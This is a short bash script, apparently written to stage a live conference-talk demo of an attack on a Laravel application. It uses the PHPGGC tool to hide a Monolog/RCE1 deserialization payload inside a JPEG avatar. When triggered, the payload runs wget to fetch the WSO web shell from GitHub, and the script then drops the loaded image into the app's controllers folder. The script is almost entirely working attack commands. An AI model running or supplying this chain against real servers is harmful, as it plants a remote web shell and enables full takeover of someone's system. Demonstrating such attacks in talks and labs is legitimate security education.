#!/bin/bash

cd /home/liam/Projects/talks/hackthesystem/tools/phpggc

echo '[liam@liam-laptop hackthesystem]$ ./phpggc -pj avatar.jpg Monolog/RCE1 system "wget https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php -O wso.php" -o loaded-mono.jpg'

sleep 5
./phpggc -pj avatar.jpg Monolog/RCE1 system "wget https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php -O wso.php" -o loaded-mono.jpg

echo '[liam@liam-laptop hackthesystem]$ mv loaded-mono.jpg ../../laravel/app/Http/Controllers/'

sleep 2;
mv loaded-mono.jpg ../../laravel/app/Http/Controllers/

